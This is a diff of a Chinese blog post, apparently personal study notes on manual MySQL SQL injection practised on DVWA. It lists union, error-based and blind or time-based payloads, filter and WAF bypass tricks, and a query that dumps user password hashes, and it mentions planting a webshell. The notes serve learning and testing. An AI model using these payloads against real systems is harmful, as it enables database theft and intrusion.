@@ -6,15 +6,22 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Tag: 安全进阶 | Hexo</title>
+  <title>MySQL的手工注入 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/tags/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/index.html">
+  <meta name="description" content="MySQL数据库的特性MySQL内置函数获取数据库类（1）获取数据库版本  version() @@version  （2）获取数据库路径：@@datadir （3）获取数据库名：database() （4）获取用户名：user() （5）组合获取  concat()                    #拼接函数，例concat(0x7e,string,0x7e)，其中0x7e为波浪号的十六进">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MySQL的手工注入">
+<meta property="og:url" content="http://example.com/2021/04/24/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/MySQL%E7%9A%84%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="MySQL数据库的特性MySQL内置函数获取数据库类（1）获取数据库版本  version() @@version  （2）获取数据库路径：@@datadir （3）获取数据库名：database() （4）获取用户名：user() （5）组合获取  concat()                    #拼接函数，例concat(0x7e,string,0x7e)，其中0x7e为波浪号的十六进">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2021/04/25/oTqezSNiplvhPM1.png">
+<meta property="article:published_time" content="2021-04-24T01:43:58.000Z">
+<meta property="article:modified_time" content="2021-04-25T13:30:53.799Z">
 <meta property="article:author" content="John Doe">
+<meta property="article:tag" content="安全进阶">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/04/25/oTqezSNiplvhPM1.png">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -150,74 +157,377 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-安全进阶/MySQL的手工注入" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2021" class="archive-year">2021</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/04/24/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/MSSSQL%E5%92%8COracle%E7%9A%84%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/" class="archive-article-date">
-  	<time datetime="2021-04-24T01:45:05.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-24</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/04/24/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/MSSSQL%E5%92%8COracle%E7%9A%84%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/">MSSSQL和Oracle的手工注入</a>
+    <h1 class="article-title" itemprop="name">
+      MySQL的手工注入
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">安全进阶</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/04/24/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/MySQL%E7%9A%84%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/" class="archive-article-date">
+        
+        <a href="/2021/04/24/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/MySQL%E7%9A%84%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/" class="archive-article-date">
   	<time datetime="2021-04-24T01:43:58.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-24</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/04/24/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/MySQL%E7%9A%84%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/">MySQL的手工注入</a>
-    </h1>
-  
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="MySQL数据库的特性"><a href="#MySQL数据库的特性" class="headerlink" title="MySQL数据库的特性"></a>MySQL数据库的特性</h2><h3 id="MySQL内置函数"><a href="#MySQL内置函数" class="headerlink" title="MySQL内置函数"></a>MySQL内置函数</h3><h4 id="获取数据库类"><a href="#获取数据库类" class="headerlink" title="获取数据库类"></a>获取数据库类</h4><p>（1）获取数据库版本</p>
+<ul>
+<li>version()</li>
+<li>@@version</li>
+</ul>
+<p>（2）获取数据库路径：@@datadir</p>
+<p>（3）获取数据库名：database()</p>
+<p>（4）获取用户名：user()</p>
+<p>（5）组合获取</p>
+<ul>
+<li>concat()                    #拼接函数，例concat(0x7e,string,0x7e)，其中0x7e为波浪号的十六进制</li>
+<li>group_concat()        #将查询的多行结果放在一行显示</li>
+</ul>
+<h4 id="功能类"><a href="#功能类" class="headerlink" title="功能类"></a>功能类</h4><p>（1）统计型</p>
+<ul>
+<li>count()            #可查询某字段有多少行记录，例count(username)</li>
+<li>length()</li>
+</ul>
+<p>（2）编码转换</p>
+<ul>
+<li>ord()</li>
+<li>char()</li>
+<li>hex()</li>
+<li>bin()</li>
+</ul>
+<p>（3）截断函数</p>
+<ul>
+<li>substr()</li>
+<li>mid()</li>
+<li>left()</li>
+<li>right()</li>
+</ul>
+<p>（4）睡眠：sleep()</p>
+<h3 id="MySQL内置系统表"><a href="#MySQL内置系统表" class="headerlink" title="MySQL内置系统表"></a>MySQL内置系统表</h3><p>information_schema数据库，该数据库默认的三张表schemata、tables、columns</p>
+<p>数据表：</p>
+<p>1.schemata  schema_name属性存放所有数据库名</p>
+<p>2.tables     table_name 存放表名</p>
+<p>3.columns column_name 存放列名</p>
+<pre><code class="SQL">-- 在imformation_schema数据库中的schemata表中查询所有数据库名称
+select schema_name from information_schema.schemata; 
 
-        <div class="article-info info-on-right">
-          
+-- 在information_schema数据库中的tables表中查询数据库名称为dvwa的所有的表的名称
+select table_name from information_schema.TABLES where table_schema=&quot;dvwa&quot;; 
+
+-- 在information_schema数据库中的columns表中查询数据库名称为dvwa的users表的的所有字段
+select column_name from information_schema.columns where table_schema=&quot;dvwa&quot; and table_name=&quot;users&quot;; 
+
+-- group_concat() 获取查询的所有结果
+-- &quot;&lt;hr&gt;&quot; 用来优化查询的显示效果(水平线)，因为该字符会伴随查询结果显示到页面上
+-- &quot;&lt;hr&gt;&quot; 可用16进制来表示，表示为 0x3c68723e
+select group_concat(&quot;&lt;hr&gt;&quot;,schema_name) from information_schema.schemata; </code></pre>
+<p><img src="https://i.loli.net/2021/04/25/oTqezSNiplvhPM1.png" alt="image-20210425204513085"></p>
+<h2 id="MySQL联合查询技巧"><a href="#MySQL联合查询技巧" class="headerlink" title="MySQL联合查询技巧"></a>MySQL联合查询技巧</h2><h3 id="获取数据的基本技巧"><a href="#获取数据的基本技巧" class="headerlink" title="获取数据的基本技巧"></a>获取数据的基本技巧</h3><p>（1）判断数据库列数：order by N，当order by N时页面报错，则判断列数为N-1</p>
+<p>（2）判断数据回显位置：union select 1,2,3,4,…..N</p>
+<p>（3）获取任意几行数据：</p>
+<pre><code class="sql">select * from admin limit 5,3         -- 跳过5行数据，选取后面三行数据，即第6,7,8行
+select * from admin limit 3 offset 5  -- 跳过5行数据，选取后面三行数据，即第6,7,8行
+-- offset X是跳过X个数据，limit Y是选取Y个数据</code></pre>
+<p>（4）“admin” 可用16进制 0x61646d696e 表示</p>
+<h3 id="编码技巧"><a href="#编码技巧" class="headerlink" title="编码技巧"></a>编码技巧</h3><p>（1）编码绕过字符串引号被过滤情况</p>
+<ul>
+<li>hex编码：hackbar–&gt;Encoding–&gt;Hex Encoding–&gt;String to 00ff00ff</li>
+<li>ASCII编码：hackbar–&gt;MySQL–&gt;MySQL CHAR()</li>
+</ul>
+<pre><code class="sql">?id=-1 UNION SELECT 1,group_concat(column_name) from information_schema.columns 
+where table_schema=&#39;admin&#39;
+?id=-1 UNION SELECT 1,group_concat(column_name) from information_schema.columns 
+where table_schema=0x61646d696e
+?id=-1 UNION SELECT 1,group_concat(column_name) from information_schema.columns 
+where table_schema=CHAR(97, 100, 109, 105, 110)</code></pre>
+<p>（2）数据库本身编码问题</p>
+<ul>
+<li>如执行UNION 查询时，报错：Illegal mix of collations for operation ‘UNION’。</li>
+<li>可以用convert()进行编码转换</li>
+</ul>
+<pre><code class="sql">-- 如：group_concat(TABLE_NAME)
+group_concat(convert(TABLE_NAME using gbk))
+group_concat(convert(TABLE_NAME using latin1))   -- 最常用
+group_concat(convert(TABLE_NAME using binary))
+group_concat(convert(TABLE_NAME using utf-8)
+group_concat(convert(TABLE_NAME using utf8))
+-- 其中， Latin1是ISO-8859-1的别名，有些环境下写作Latin-1。ISO-8859-1编码是单字节编码，向下兼容ASCII。</code></pre>
+<h2 id="MySQL报错注入技巧"><a href="#MySQL报错注入技巧" class="headerlink" title="MySQL报错注入技巧"></a>MySQL报错注入技巧</h2><p>（1）使用条件：HTTP返回包中含有原始数据库的报错信息。</p>
+<p>（2）MYSQL报错注入和核心——报错函数</p>
+<ul>
+<li>extractvalue()</li>
+</ul>
+<pre><code class="sql">id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)))</code></pre>
+<ul>
+<li>updatexml()</li>
+</ul>
+<pre><code class="sql">id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1))</code></pre>
+<ul>
+<li>exp()</li>
+</ul>
+<pre><code class="sql">id=1 and exp(~(select * from(select user())a))</code></pre>
+<h2 id="MySQL盲注技巧"><a href="#MySQL盲注技巧" class="headerlink" title="MySQL盲注技巧"></a>MySQL盲注技巧</h2><p>（1）使用条件：HTTP返回包中没有执行结果的数据和报错信息。</p>
+<p>（2）MYSQL盲注的核心——字符串截断函数、条件判断语句</p>
+<ul>
+<li>left(string,n)函数，取字符串的前n个字符</li>
+</ul>
+<pre><code class="sql">?id=1 and left(database(),1)=&quot;a&quot;     --&gt; TRUE
+?id=1 and left(database(),2)=&quot;ad&quot;    --&gt; TRUE
+?id=1 and left(database(),3)=&quot;adm&quot;   --&gt; TRUE
+?id=1 and left(database(),4)=&quot;admi&quot;  --&gt; TRUE
+?id=1 and left(database(),5)=&quot;admin&quot; --&gt; TRUE</code></pre>
+<ul>
+<li>substr(string,m,n)、mid()函数 ，其中substr较常用，n表示取n个字符，m表示从第几个开始取。（取字符串的第m个到第n个字符。）</li>
+</ul>
+<pre><code class="sql">?id=1 and substr(database(),1,1)=&quot;a&quot;    --&gt; TRUE 
+?id=1 and substr(database(),1,2)=&quot;ad&quot;   --&gt; TRUE 
+?id=1 and substr(database(),1,3)=&quot;adm&quot;  --&gt; TRUE 
+?id=1 and substr(database(),1,4)=&quot;admi&quot; --&gt; TRUE 
+?id=1 and substr(database(),1,5)=&quot;admin&quot; --&gt; TRUE
+-- 或者：
+?id=1 and substr(database(),1,1)=&quot;a&quot; --&gt; TRUE 
+?id=1 and substr(database(),2,1)=&quot;d&quot; --&gt; TRUE 
+?id=1 and substr(database(),3,1)=&quot;m&quot; --&gt; TRUE 
+?id=1 and substr(database(),4,1)=&quot;i&quot; --&gt; TRUE 
+?id=1 and substr(database(),5,1)=&quot;n&quot; --&gt; TRUE </code></pre>
+<ul>
+<li>regexp+’正则表达式’</li>
+</ul>
+<pre><code class="sql">id=1 and (select database() regexp=&#39;^a&#39;) -- ^表示匹配前面字符串的第一个字符。
+id=1 and (select database() regexp=&#39;^ad&#39;) -- ^表示匹配前面字符串的前两个字符。</code></pre>
+<ul>
+<li>like + 条件 （模糊匹配，用于替代=）</li>
+</ul>
+<pre><code class="sql">?id=1 and (select database() like &#39;a%&#39;) --&gt; TRUE 
+?id=1 and (select database() like &#39;ad%&#39;) --&gt; TRUE 
+?id=1 and (select database() like &#39;adm%&#39;) --&gt; TRUE 
+?id=1 and (select database() like &#39;admi%&#39;) --&gt; TRUE 
+?id=1 and (select database() like &#39;admin%&#39;) --&gt; TRUE </code></pre>
+<ul>
+<li>取ascii()、ord()来精确获取值（避免大小写字母无法判断的情况）</li>
+</ul>
+<pre><code class="sql">?id=1 and ascii(substr(database(),1,1))=97 --&gt;TRUE
+?id=1 and ascii(substr(database(),1,1))=64 --&gt;FALSE</code></pre>
+<ul>
+<li>取hex 来精确获取值（避免大小写字母无法判断的情况）</li>
+</ul>
+<pre><code class="sql">?id=1 and hex(substr(database(),1,1))=61 --&gt;TRUE
+?id=1 and hex(substr(database(),1,1))=41 --&gt;FALSE</code></pre>
+<ul>
+<li>在语句中添加binary （二进制）来精确获取值（避免大小写字母无法判断的情况）</li>
+</ul>
+<pre><code class="sql">?id=1 and (select binary database() regexp&#39;^a&#39;)  --&gt;TRUE
+?id=1 and (select binary database() regexp&#39;^A&#39;)  --&gt;FALSE</code></pre>
+<ul>
+<li>if()函数</li>
+</ul>
+<pre><code class="sql">?id=1 and 1=if(left(database(),1)=&#39;a&#39;,1,0)         --&gt;TRUE
+?id=1 and 1=if(substr(database(),1,1)=&#39;a&#39;,1,0)     --&gt;TRUE
+?id=1 and 1=if(ascii(left(database(),1))=&#39;97&#39;,1,0) --&gt;TRUE
+?id=1 and 1=if(ord(left(database(),1))=&#39;97&#39;,1,0)   --&gt;TRUE
+?id=1 and 1=if(database() regexp&#39;^a&#39;,1,0)          --&gt;TRUE
+?id=1 and if(left(database(),1)=&#39;a&#39;,sleep(3),0)    --&gt;TRUE</code></pre>
+<h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><p>正则表达式(regexp)的主要作用：分割、匹配、查找、替换</p>
+<p>WAF—Web Application Firewall(Web应用防火墙)</p>
+<p>*匹配前一个字符出现0次或者无限次</p>
+<p>?匹配前一个字符出现1次或者0次，即要么有1次，要么没有</p>
+<p>.*任意一个字符可以出现0次或无限次（贪婪匹配，尽可能多地匹配）</p>
+<p>.*?仍然表示任意一个字符可以出现0次或无限次（非贪婪匹配，尽可能少地区匹配）</p>
+<pre><code>正则表达式：.*test.* 在任意字符中匹配test
+test1
+test2
+test3
+3test4</code></pre>
+<pre><code>.*t     匹配结果：123456test #匹配到的是最后一个t，前面的所有内容包括tes都被当做任意字符去匹配，可出现0次或无限次
+.*?t    匹配结果：123456t   #匹配到的是第一个t，前面的123456被当做任意字符
+123456test</code></pre>
+<p>preg_match((.*?),$_GET[‘user’],$return);  //在字符串中查找匹配项，返回一个数组</p>
+<p>preg_replace((.*?),’\\n’,$_GET[‘user’]);    //将查找到的字符串替换成\\n</p>
+<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>报错注入的测试语句 ‘ “ ) —联合查询、报错</p>
+<p>布尔型 and 1=1 and 1=2 —–布尔型盲注</p>
+<p>时间型 and sleep(5) —-时间型盲注</p>
+<p>步骤：</p>
+<p>1.选择该注入点的注入方式</p>
+<p>2.判断数据库类型</p>
+<p>3.选择漏洞利用的目标，优先选择读写文件</p>
+<p>4.构造SQL语句进行攻击</p>
+<h3 id="SQL注入步骤"><a href="#SQL注入步骤" class="headerlink" title="SQL注入步骤"></a>SQL注入步骤</h3><h4 id="1-对某个网站进行注入，分为四个步骤"><a href="#1-对某个网站进行注入，分为四个步骤" class="headerlink" title="1.对某个网站进行注入，分为四个步骤"></a>1.对某个网站进行注入，分为四个步骤</h4><ul>
+<li>判断闭合类型、使用的语句方法</li>
+<li>判断数据库 —SQL语句判断（表的特征）或者根据网站环境猜测，也可以根据返回的报错信息判断。</li>
+</ul>
+<pre><code>不同数据库的特征：
+mysql information_schema
+sqlserver sysobjects
+oracle dual</code></pre>
+<ul>
+<li>选择利用的操作 – 操作数据/执行命令/读写文件（通过在网站下写一句话木马来控制服务器，但前提是知道网站根目录的绝对路径）</li>
+<li>构造SQL注入语句 – 向数据库发起查询以获取有用的信息。</li>
+</ul>
+<h4 id="2-MySQL手工注入的方式"><a href="#2-MySQL手工注入的方式" class="headerlink" title="2.MySQL手工注入的方式"></a>2.MySQL手工注入的方式</h4><ul>
+<li>联合查询 使用union操作符将两个select语句拼接起来同时在数据库中进行查询，将查询结果显示在页面上。</li>
+<li>报错注入 通过网站的报错信息，某些特殊函数会将函数内的SQL语句进行执行，若该函数出现报错，则会将查询结果返回在页面上。</li>
+<li>布尔型盲注 通过网站不同的回显信息，判断查询语句的正确与否，可以在and后构造SQL语句向数据库发起查询，若后续的SQL语句正确，则返回正常结果，以此获取信息 例如：id=1 and 1=1 返回正常；id=1 and 1=2 返回异常；</li>
+<li>时间型盲注 通过页面的返回时间来判断SQL语句是否正确。若正确，例如在SQL查询语句后加上sleep(5)来判断。</li>
+</ul>
+<h4 id="3-MySQL中如何进行对应的注入"><a href="#3-MySQL中如何进行对应的注入" class="headerlink" title="3.MySQL中如何进行对应的注入"></a>3.MySQL中如何进行对应的注入</h4><ul>
+<li>内置数据库：information_schema</li>
+</ul>
+<pre><code>内置表schemata，存放数据库名
+内置表tables，存放表名和数据库名的对应关系
+内置表columns，存放了字段名和表名、数据库名的对应关系</code></pre>
+<ul>
+<li>联合查询</li>
+</ul>
+<pre><code>order by 以查询结果中的某一列进行排序。若该列不存在，则会产生报错。
+union select 使用union操作符将前后两个select语句放在数据库中同时查询（union操作符前后的select语句列数、字符类型需要相等）由于MySQL是弱类型数据库，故不需要字符类型相同。</code></pre>
+<h4 id="4-联合查询的流程"><a href="#4-联合查询的流程" class="headerlink" title="4.联合查询的流程"></a>4.联合查询的流程</h4><ul>
+<li>判断可以注入的方式以及该注入点的闭合形式</li>
+<li>判断前一个SQL语句查询的列数（order by）</li>
+</ul>
+<pre><code>例如对dvwa的注入过程：
+单引号字符型
+联合查询 报错注入 盲注
+判断前一个查询语句查询了两列
+判断数据的回显位置（把前面的SQL参数置空，在后面使用union select 1,2来判断回显位置）
+说明union select查询的两个字段都会显示在页面上，则可以在1和2的位置构造SQL语句向数据库发起查询。
+将查询结果放在一行显示用group_concat()函数。
+编码问题convert--用来解决查询时的编码问题。该函数可以修改当前数据库的查询编码convert(colname using latin1)
+获取数据库名、表名和列名后查询数据,查询user和password字段的值：
+-1&#39; union select user,password form dvwa.users;</code></pre>
+<ul>
+<li>union select查询数据库、表、字段、数据的信息</li>
+<li>union特性：前后的select语句的列数必须一致 —-需要知道网站构造的SQL语句查询了几个字段</li>
+</ul>
+<pre><code>1&#39; union select 1,2#         字符型
+1 union select 1,2           数字型</code></pre>
+<ul>
+<li>查询时一般让union前的SQL语句执行结果置空，转而执行union后面的select查询语句。</li>
+</ul>
+<pre><code>-1&#39; union select 1,2#
+#convert(xxx using latin1) 进行编码转化,避免查询的前后两个字段编码不同。
+select 1,convert(table_name using latin1) from information_schema.TABLES where table_schema=&quot;dvwa&quot;;
+
+#group_concat()函数，将查询的结果放在一行显示
+select 1,group_concat(convert(table_name using latin1)) from information_schema.TABLES where table_schema=&quot;dvwa&quot;;</code></pre>
+<h5 id="EXP-amp-PoC"><a href="#EXP-amp-PoC" class="headerlink" title="EXP &amp; PoC"></a>EXP &amp; PoC</h5><p>EXP:exploit 攻击脚本–如何利用该漏洞执行特定的效果(操作数据、控制系统)–有害的</p>
+<pre><code>-1&#39; union select database(),group_concat(convert(schema_name using latin1)) from information_schema.schemata#;获取当前数据库名和网站数据库中的所有数据库名</code></pre>
+<p>PoC：Proof of Concept观点证明–证明该漏洞存在 —无害的</p>
+<pre><code>1&#39; union select 1,2#      可以发现存在的漏洞</code></pre>
+<h4 id="5-报错注入、盲注的流程"><a href="#5-报错注入、盲注的流程" class="headerlink" title="5.报错注入、盲注的流程"></a>5.报错注入、盲注的流程</h4><ul>
+<li>判断注入方式及闭合形式（不需要判断前一个SQL语句查询的列数。）</li>
+<li>使用特定语法进行注入，查询数据库、表、字段、数据的信息</li>
+</ul>
+<pre><code>报错注入函数
+extractvalue(value,path)--如果在path位置构造一个SQL语句，这个语句会先将被数据库进行执行。若path位置存在错误，则extractvalue函数会产生报错，将报错信息显示在页面上。该函数存在吃字符现象，无法完全显示报错的返回结果。
+报错注入的重点：在path的位置构造一个子句</code></pre>
+<ul>
+<li>limit(m,n)从第m行开始，查询后n行的数据。</li>
+</ul>
+<pre><code>limit(0,1) //从第0行开始，向后查询1行。也就是只查询第1行
+limit(5,3) //从第5行开始，向后查询3行。也就是查询6,7,8行。</code></pre>
+<h4 id="6-盲注"><a href="#6-盲注" class="headerlink" title="6.盲注"></a>6.盲注</h4><p>（1）核心思想：根据页面是否正常返回结果来判断后面构造的SQL语句是否正确。</p>
+<pre><code>select * from users where user_id=&quot;1&quot; and (select database())=&quot;dvwa&quot;;</code></pre>
+<p>（2）截断函数left()</p>
+<pre><code>select * from users where user_id=&quot;1&quot; and (select left(database(),1))=char(97);</code></pre>
+<p>（3）substr(string,m,n) ，该函数可返回字符串的一部分。例如，substr(string,1,1)返回从第1个到第3个字符。substr(string,2,1)表示从第2个字符开始，返回1个字符；也就是返回第2个字符</p>
+<pre><code>爆破思想：只改变m和等号后面的字符
+id=1 and (select substr(database(),1,1))=&quot;a&quot;
+id=1 and substr(database(),2,1)=&quot;d&quot;
+id=1 and substr(database(),3,1)=&quot;m&quot;
+id=1 and substr(database(),4,1)=&quot;i&quot;
+id=1 and substr(database(),5,1)=&quot;n&quot;</code></pre>
+<p>（4）regexp+‘正则表达式’</p>
+<pre><code>id=1 and (select database() regexp=&#39;^a&#39;) //^表示匹配前面字符串的第一个字符。
+id=1 and (select database() regexp=&#39;^ad&#39;) //^表示匹配前面字符串的前两个字符。</code></pre>
+<p>（5）length()</p>
+<pre><code>1&#39; and (select length(database())&lt;10)</code></pre>
+<p>（6）步骤：</p>
+<ul>
+<li>获取当前需要查询的内容的长度</li>
+<li>根据对应的长度进行每一位字符的爆破</li>
+</ul>
+<p>（7）常用工具：Burp Suite。爆破时可能会存在符号编码问题(例如引号、空格无法识别），可在网页中提交时用burp抓包后发送到Intruder再标记要爆破的内容。</p>
+<pre><code>1&#39; and (select substr(database(),1,1)=char(97))#
+1&#39; and (select substr(database(),2,1)=char(97))#
+1&#39; and (select substr(database(),3,1)=char(97))#
+1&#39; and (select substr(database(),4,1)=char(97))#
+1&#39; and (select substr(database(),1,1)=char(98))#
+1&#39; and (select substr(database(),2,1)=char(98))#
+......</code></pre>
+<p>逗号的ASCII码为44，可用此来区分返回结果中的不同数据库名称、表名、字段名、数据。</p>
+<p>字母a-z：97-122，MySQL对大小写不敏感</p>
+<p>数字0-1:448-57</p>
+<p>下划线：95</p>
+<p><strong>时间型盲注</strong>：</p>
+<p>if()函数。</p>
+<pre><code>#1=1是条件，success为条件成立时的操作，failed为条件不成立的操作
+select if(1=1,&quot;success&quot;,&quot;failed&quot;) 
+select if(&quot;sql语句&quot;=&quot;值&quot;,sleep(3),0)
+
+?id=1&#39; and if(left(database(),1)=&#39;a&#39;,sleep(3),0)</code></pre>
+<h2 id="常见的过滤"><a href="#常见的过滤" class="headerlink" title="常见的过滤"></a>常见的过滤</h2><ul>
+<li>单引号、双引号被过滤，用char()、十六进制。</li>
+<li>substr()被过滤，用left()、mid()、regexp()、like()</li>
+<li>extractvalue()被过滤，用updataxml()、floor()、exp()</li>
+<li>在单引号、双引号前加了转义符，则用宽字节注入 引号前加%df</li>
+<li>过滤了union、select、where等字符串</li>
+</ul>
+<pre><code>将关键字替换成了空字符，
+1.这时可用双写绕过，ununionion
+2.大小写绕过，UnioN</code></pre>
+<ul>
+<li>过滤空格</li>
+</ul>
+<pre><code>将空格替换成了空字符
+1./**/
+2.0x09
+3.&#123;$IFS&#125; （在Linux中，代表一个空格）</code></pre>
+<ul>
+<li>宽字节注入、堆叠注入</li>
+</ul>
+<h2 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h2><p>order by  x 以x列进行排序</p>
+<p>若order by 3显示正常，order by 4显示异常，则代表有3列</p>
+<p>用order by判断列数时可借助二分法的思想快速判断。</p>
+<pre><code>1&#39; order by 4 --+            字符型
+1 order by 4                 数字型</code></pre>
+<h2 id="Windows下的命令"><a href="#Windows下的命令" class="headerlink" title="Windows下的命令"></a>Windows下的命令</h2><pre><code>netstat -ano | findstr &quot;8080&quot;   //查询8080端口是否被占用
+tasklist /svc | findstr 9940   //查询9940这个进程</code></pre>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -229,171 +539,128 @@
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/04/24/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/MySQL%E7%9A%84%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/04/18/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5%E8%BF%9B%E9%98%B6/" class="archive-article-date">
-  	<time datetime="2021-04-18T01:41:12.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-18</time>
-</a>
+<nav id="article-nav">
+  
+    <a href="/2021/04/24/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/MSSSQL%E5%92%8COracle%E7%9A%84%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          MSSSQL和Oracle的手工注入
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/04/18/Python/%E8%BF%90%E7%94%A8Python%E8%AF%AD%E8%A8%80(%E4%BA%94)-%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB%E5%92%8C%E8%87%AA%E5%8A%A8%E5%8C%9601/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">运用Python语言(五)-网络爬虫和自动化01</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
